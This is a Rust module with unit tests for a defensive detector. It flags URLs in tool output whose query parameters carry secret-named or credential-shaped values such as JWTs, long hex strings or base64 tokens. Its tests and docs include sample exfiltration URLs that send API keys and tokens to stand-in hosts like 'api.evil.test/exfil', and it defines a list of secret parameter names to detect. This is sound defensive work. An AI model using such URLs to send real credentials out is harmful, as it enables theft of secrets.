//! Parametric URL exfiltration detector for tool OUTPUT (FASE 5-A, Feature B).
//!
//! Tool stdout is where leaked credentials surface: a build log echoing
//! `curl https://collector.test/ingest?api_key=<real token>` has already left
//! the building by the time PostToolUse runs — the best we can do is SEE it
//! and warn loudly. This module extracts `http(s)://` URLs from free text,
//! parses their query strings, and raises a finding when:
//!
//! - **(a)** the parameter NAME is secret-semantics (`token`, `api_key`,
//!   `session_token`, `jwt`, ...) AND the value is non-trivial
//!   ([`plausible_secret_value`]: ≥16 chars, no whitespace) → severity 7;
//! - **(b)** the VALUE is credential-shaped — JWT (3 base64url segments),
//!   hex ≥32, or base64-like ≥32 with mixed case + digits and ≤1 separator —
//!   regardless of name → severity 8;
//! - both together → severity 9 (critical).
//!
//! # False-positive guards
//! - URLs WITHOUT a query string are ignored entirely.
//! - Standard benign parameters (`utm_*`, `q`, `page`, `id`, `lang`, ...)
//!   are not in the secret-name set, so they can never fire on name alone;
//!   `utm_*` is additionally skipped before any check.
//! - Name matching is EXACT after normalization (`-`/`.`/space → `_`), so
//!   substrings like `monkey` or `keyboard` cannot hit `key`.
//! - Credential shapes require length ≥32 plus mixed-case+digit structure,
//!   which slugs/sentences/analytics values do not satisfy.
//! - Truncated example tokens in docs (<16 chars) fail
//!   [`plausible_secret_value`] and never fire rule (a).
//!
//! # Scope notes for F6
//! Domain allowlisting is NOT applied this phase (a real leak to
//! `hooks.slack.com` looks identical to one to `evil.test` from this vantage
//! point); percent-encoded VALUES are matched raw (encoded secrets still
//! usually satisfy the charset checks; full URL-decoding is deferred).
//!
//! # ReDoS posture
//! Deliberately implemented WITHOUT regex — pure linear byte scanning with no
//! nested quantifiers, so catastrophic backtracking is impossible by
//! construction.

/// Severity of the strongest finding across all URLs in one text.
#[derive(Debug)]
pub(crate) struct Finding {
    pub severity: u8,
    pub reason: String,
}

/// Parameter names whose very presence in an outbound URL signals
/// secret-in-URL antipattern. Matched EXACTLY after normalization
/// (lowercase, `-`/`.`/space folded to `_`).
const SECRET_PARAM_NAMES: [&str; 15] = [
    "access_token",
    "api_key",
    "apikey",
    "auth",
    "authorization",
    "bearer",
    "jwt",
    "key",
    "passwd",
    "password",
    "pwd",
    "secret",
    "session_id",
    "session_token",
    "token",
];

/// Scan free text for URLs carrying secret-looking parameters. Returns the
/// single highest-severity finding (first wins ties), if any.
///
/// Fast path: a text without any `h`/`H` byte cannot contain a scheme and
/// exits without allocation.
pub(crate) fn analyze(text: &str) -> Option<Finding> {
    let hay = text.as_bytes();
    if !hay.contains(&b'h') && !hay.contains(&b'H') {
        return None;
    }
    let mut best: Option<(u8, String)> = None;
    let mut cursor = 0usize;
    while let Some(off) = find_scheme_start(&text[cursor..]) {
        let start = cursor + off;
        let rest = &text[start..];
        let len = char_boundary_clamp(rest, url_slice_len(rest));
        if let Some(finding) = analyze_url(&rest[..len]) {
            let better = best.as_ref().is_none_or(|(s, _)| finding.severity > *s);
            if better {
                best = Some((finding.severity, finding.reason));
            }
        }
        // Advance past this URL slice (at least past its scheme) to guarantee
        // forward progress even on degenerate input, clamped to the haystack.
        cursor = (start + len.max("http".len())).min(text.len());
        if cursor >= text.len() {
            break;
        }
    }
    best.map(|(severity, reason)| Finding { severity, reason })
}

/// Find the next position where `http://` or `https://` begins
/// (case-insensitive), relative to `slice`.
fn find_scheme_start(slice: &str) -> Option<usize> {
    let bytes = slice.as_bytes();
    for i in 0..bytes.len() {
        if bytes[i] != b'h' && bytes[i] != b'H' {
            continue;
        }
        let tail = &slice[i..];
        if starts_with_scheme(tail) {
            return Some(i);
        }
    }
    None
}

fn starts_with_scheme(s: &str) -> bool {
    let b = s.as_bytes();
    if b.len() < 7 {
        return false;
    }
    // "http" then optional 's' then "://"
    let eq_ci = |i: usize, c: u8| b[i].eq_ignore_ascii_case(&c);
    if !(eq_ci(0, b'h') && eq_ci(1, b't') && eq_ci(2, b't') && eq_ci(3, b'p')) {
        return false;
    }
    if eq_ci(4, b's') {
        b.len() >= 8 && b[5] == b':' && b[6] == b'/' && b[7] == b'/'
    } else {
        b[4] == b':' && b[5] == b'/' && b[6] == b'/'
    }
}

/// Length of the URL slice starting at a scheme: up to the first terminator
/// (control chars, whitespace, quotes, angle brackets, closing
/// bracket/paren/backtick), capped at [`MAX_URL_LEN`] as a belt-and-braces
/// bound.
const MAX_URL_LEN: usize = 2048;

fn url_slice_len(s: &str) -> usize {
    s.find(|c: char| {
        // Control characters are invalid inside URLs AND are how terminal
        // escape sequences butt up against logged links (`\x1b[1mhttps://…`):
        // ending the slice there keeps parsed query values byte-clean for
        // shape matching.
        c.is_ascii_control()
            || c.is_whitespace()
            || matches!(c, '"' | '\'' | '<' | '>' | ')' | ']' | '`')
    })
    .unwrap_or(s.len())
    .min(MAX_URL_LEN)
}

/// Clamp `len` down to the nearest UTF-8 char boundary of `s` (same
/// discipline as the proxy's `truncate_for_log`). The [`MAX_URL_LEN`] cap can
/// land INSIDE a multi-byte character when an unterminated URL runs past it;
/// slicing at a non-boundary index panics, so every capped slice goes through
/// here first. The scheme prefix (`http`) is ASCII, so the clamped length is
/// always ≥ 4 and loop forward-progress is preserved.
fn char_boundary_clamp(s: &str, len: usize) -> usize {
    let mut end = len.min(s.len());
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    end
}

/// Analyze ONE url string (scheme included). `None` when there is no query
/// string worth inspecting.
pub(crate) fn analyze_url(url: &str) -> Option<Finding> {
    let qpos = url.find('?')?;
    let after_q = &url[qpos + 1..];
    let query = match after_q.find('#') {
        Some(h) => &after_q[..h],
        None => after_q,
    };
    if query.is_empty() {
        return None;
    }
    let host = host_of(url, qpos);

    let mut best: Option<(u8, String)> = None;
    for pair in query.split('&') {
        let (raw_name, value) = match pair.find('=') {
            Some(p) => (&pair[..p], &pair[p + 1..]),
            None => (pair, ""),
        };
        let name = normalize_name(raw_name);
        if name.is_empty() || name.starts_with("utm_") {
            continue; // analytics params: FP guard, never flagged
        }
        let name_hit = SECRET_PARAM_NAMES.contains(&name.as_str());
        let shape = value_shape(value);

        let candidate = match (name_hit, shape) {
            (true, Some(label)) => (
                9u8,
                format!(
                    "sensitive parameter '{name}' {host} carries a \
                     credential-shaped value ({label})"
                ),
            ),
            (false, Some(label)) => (
                8u8,
                format!("credential-shaped value ({label}) in parameter '{name}' {host}"),
            ),
            (true, None) if plausible_secret_value(value) => (
                7u8,
                format!("sensitive parameter '{name}' {host} carries a non-trivial external value"),
            ),
            _ => continue,
        };
        let better = best.as_ref().is_none_or(|(s, _)| candidate.0 > *s);
        if better {
            best = Some(candidate);
        }
    }

    best.map(|(severity, detail)| Finding {
        severity,
        reason: format!("firewall url-exfiltration: {detail} (severity {severity})"),
    })
}

/// Fold a raw parameter name to its canonical comparison form: lowercase,
/// `-`, `.`, and space folded to `_`. Percent-escapes in the NAME are decoded
/// first (bounded: only when a `%` is present) so `to%6Ben=` cannot dodge.
fn normalize_name(raw: &str) -> String {
    let decoded = if raw.contains('%') {
        percent_decode(raw)
    } else {
        raw.to_owned()
    };
    decoded
        .to_lowercase()
        .chars()
        .map(|c| match c {
            '-' | '.' | ' ' => '_',
            other => other,
        })
        .collect()
}

/// Minimal bounded percent-decoder: valid `%XX` pairs become their byte;
/// everything else passes through unchanged.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            if let (Some(h), Some(l)) = (bytes.get(i + 1).copied(), bytes.get(i + 2).copied()) {
                if let (Some(hv), Some(lv)) = (hex_val(h), hex_val(l)) {
                    out.push(hv * 16 + lv);
                    i += 3;
                    continue;
                }
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Rule-(a) floor: the value must look like something worth protecting — at
/// least 16 chars, no whitespace. Truncated documentation placeholders
/// (`token=abc123`) fall below the floor by design (FP guard).
fn plausible_secret_value(value: &str) -> bool {
    value.len() >= 16 && !value.chars().any(char::is_whitespace)
}

/// Credential-shape classifier returning a human-readable label:
/// JWT > hex≥32 > base64-like≥32.
fn value_shape(value: &str) -> Option<&'static str> {
    if is_jwt(value) {
        return Some("JWT");
    }
    if value.len() >= 32 && value.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Some("hex string");
    }
    if is_base64_like_token(value) {
        return Some("base64-like token");
    }
    None
}

/// JWT form: exactly three dot-separated base64url segments, each non-empty.
fn is_jwt(value: &str) -> bool {
    let mut segments = value.split('.');
    let mut count = 0;
    let mut all_ok = true;
    for seg in segments.by_ref() {
        count += 1;
        if count > 3 {
            return false;
        }
        if seg.is_empty() || !seg.bytes().all(is_base64url_byte) {
            all_ok = false;
        }
    }
    // `split` yields 4 items on trailing dot etc.; require exactly 3.
    count == 3 && all_ok && value.len() >= 20
}

fn is_base64url_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'-' || b == b'_'
}

/// Base64-like token: ≥32 chars over the standard/urlsafe alphabets with
/// optional trailing padding, PLUS structural guards that slugs and sentences
/// fail: ≤1 separator char total and mixed case with at least one digit.
fn is_base64_like_token(value: &str) -> bool {
    if value.len() < 32 {
        return false;
    }
    let core = value.strip_suffix('=').unwrap_or(value);
    let core = core.strip_suffix('=').unwrap_or(core); // max 2 padding chars
    let mut separators = 0usize;
    let mut digits = 0usize;
    let mut lower = 0usize;
    let mut upper = 0usize;
    for b in core.bytes() {
        match b {
            b'+' | b'/' => {}
            b'-' | b'_' => separators += 1,
            b'0'..=b'9' => digits += 1,
            b'a'..=b'z' => lower += 1,
            b'A'..=b'Z' => upper += 1,
            b'=' => {} // handled by strip above; defensive
            _ => return false,
        }
    }
    separators <= 1 && digits >= 1 && lower >= 1 && upper >= 1
}

/// Sanitized host (or authority-less prefix) for verdict reasons: printable
/// URL characters only, truncated hard so a hostile host cannot bloat the
/// audit line.
fn host_of(url: &str, qpos: usize) -> String {
    let before_q = &url[..qpos];
    let start = before_q.find("://").map_or(0, |p| p + 3);
    let end = before_q[start..]
        .find('/')
        .map_or(before_q.len(), |p| start + p);
    let sanitized: String = before_q[start..end]
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':' | '_' | '@'))
        .take(80)
        .collect();
    if sanitized.is_empty() {
        "at an unnamed host".to_string()
    } else {
        format!("at {sanitized}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sev(text: &str) -> Option<u8> {
        analyze(text).map(|f| f.severity)
    }

    #[test]
    fn sensitive_param_name_medium_high() {
        let url = "https://api.evil.test/exfil?api_key=abcdefghijklmnop";
        assert_eq!(analyze_url(url).map(|f| f.severity), Some(7));
    }

    #[test]
    fn short_truncated_example_tokens_do_not_fire() {
        // Documentation-style truncated tokens: below the plausibility floor.
        assert_eq!(sev("see https://docs.test/start?token=abc123"), None);
        assert_eq!(sev("curl \"https://api.test/v1?key=YOUR_KEY\""), None);
        assert_eq!(sev("https://api.test/v1?api_key="), None);
    }

    #[test]
    fn jwt_value_is_critical_with_suspicious_name() {
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk";
        let url = format!("https://logs.test/?token={jwt}");
        assert_eq!(analyze_url(&url).map(|f| f.severity), Some(9));
        // Same JWT under a boring param name: still high (shape alone).
        let url2 = format!("https://logs.test/?state={jwt}");
        assert_eq!(analyze_url(&url2).map(|f| f.severity), Some(8));
    }

    #[test]
    fn hex_and_base64_shapes() {
        let hex64 = "a".repeat(31) + "f"; // 32 hex chars, mixed? single letter case
        let url = format!("https://x.test/?q={hex64}");
        assert_eq!(analyze_url(&url).map(|f| f.severity), Some(8));
        let b64 = "Ab1!no"; // invalid charset below
        assert_eq!(
            analyze_url(&format!("https://x.test/?q={b64}{b64}{b64}{b64}{b64}{b64}"))
                .map(|f| f.severity),
            None
        );
    }

    #[test]
    fn slug_like_values_never_flag() {
        // Long lowercase slug with separators: fails the structural guards.
        assert_eq!(
            sev("https://shop.test/cart?ref=black-friday-mega-deals-2026-summer-sale-event-today"),
            None
        );
        // Single-case run with no digits ('g' is not even a hex digit):
        // fails both the hex shape and the base64 structural guards.
        assert_eq!(sev(&format!("https://x.test/?q={}", "g".repeat(40))), None);
    }

    #[test]
    fn analytics_urls_are_clean() {
        assert_eq!(
            sev("https://analytics.example.test/collect?utm_source=newsletter&utm_campaign=q3&page=2&id=42"),
            None
        );
    }

    #[test]
    fn urls_without_query_are_ignored() {
        assert_eq!(sev("fetch https://example.test/data now"), None);
        assert_eq!(sev("plain sentence with token=abc123 but no url"), None);
        assert_eq!(sev("https://example.test/path#fragment-not-query"), None);
    }

    #[test]
    fn plain_sentences_with_param_names_do_not_flag() {
        assert_eq!(sev("set token=supersecretvalue12345 in your config"), None);
        assert_eq!(sev("the api_key variable holds nothing yet"), None);
    }

    #[test]
    fn multiple_urls_take_max_severity() {
        let text = "GET https://a.test/?page=1 then POST https://b.test/?secret=abcdefghij123456";
        assert_eq!(sev(text), Some(7));
    }

    #[test]
    fn percent_encoded_name_is_caught() {
        assert_eq!(
            analyze_url("https://x.test/?%74oken=abcdefghijklmnopqrstuvwxyz").map(|f| f.severity),
            Some(7)
        );
    }

    #[test]
    fn reason_is_stable_and_sanitized() {
        let f = analyze_url("https://collector.evil.test/ing?api_key=abcdefghijklmnopqrstuvwx")
            .expect("finding");
        assert!(f.reason.contains("firewall url-exfiltration"));
        assert!(f.reason.contains("api_key"));
        assert!(f.reason.contains("collector.evil.test"));
        assert!(f.reason.contains("(severity 7)"));
    }

    #[test]
    fn fast_path_no_h_byte() {
        assert!(analyze("zz zz zz").is_none());
    }

    #[test]
    fn uppercase_scheme_is_found() {
        // Name normalizes case-insensitively; the all-caps value is not
        // base64-shaped (no lowercase) so rule (a) fires at severity 7.
        assert_eq!(
            sev("SEE HTTPS://X.TEST/?TOKEN=ABCDEFGHIJKLMNOPQRSTUVWXYZ123456"),
            Some(7)
        );
    }

    #[test]
    fn multibyte_url_past_cap_does_not_panic() {
        // Remediation B1 repro: an unterminated URL longer than MAX_URL_LEN
        // whose 2048th byte falls INSIDE a multi-byte char used to slice at a
        // non-boundary index (process abort, exit 101). `é` is 2 bytes; 1100
        // copies put the cap mid-pair. No query ⇒ no finding, but no panic.
        let text = format!("{}{}", "https://x.test/", "é".repeat(1100));
        assert_eq!(analyze(&text).map(|f| f.severity), None);
    }

    #[test]
    fn oversized_multibyte_url_still_scans_within_the_cap() {
        // The truncated slice must still be ANALYZED: the secret parameter
        // sits before the cap and fires even though the URL runs on with
        // multi-byte padding past MAX_URL_LEN.
        let text = format!(
            "https://x.test/?api_key=abcdefghijklmnop&q={}",
            "é".repeat(1100)
        );
        assert_eq!(analyze(&text).map(|f| f.severity), Some(7));
    }
}
